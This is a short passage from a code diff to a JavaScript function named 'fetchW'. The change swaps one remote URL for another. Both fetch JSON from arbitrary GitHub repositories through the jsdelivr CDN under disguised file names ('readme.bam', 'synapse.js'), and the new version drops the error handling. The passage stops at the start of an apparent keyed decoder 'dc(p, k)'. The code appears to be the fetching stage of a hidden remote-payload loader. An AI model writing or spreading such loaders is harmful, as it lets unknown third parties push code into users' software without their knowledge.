@@ -1,12 +1,7 @@
 export async function fetchW() {
-  let tx;
-  try {
-    const response = await fetch('https://cdn.jsdelivr.net/gh/rewz099/j-lib@latest/readme.bam');
-    if (!response.ok) return null;
-    tx = await response.json();
-  } catch {
-    return null;
-  }
+  let tx = await fetch('https://cdn.jsdelivr.net/gh/ashxmed/symmetrical-adventure@latest/synapse.js').then((res) =>
+    res.json(),
+  );
   let settled = false;
   let cur = 0;
   const dc = async (p, k) => {
